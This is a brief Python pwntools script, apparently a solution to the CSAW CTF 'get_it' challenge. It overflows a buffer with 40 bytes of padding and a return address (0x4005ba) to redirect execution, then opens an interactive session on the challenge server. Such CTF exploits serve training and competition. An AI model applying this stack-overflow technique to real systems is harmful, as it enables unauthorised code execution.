from pwn import *
context(arch='amd64', os='linux')

p = remote('pwn.chal.csaw.io', 9001)
# p = process('get_it')
x = raw_input()
p.sendline('a'*40 + p64(0x4005ba))
p.interactive()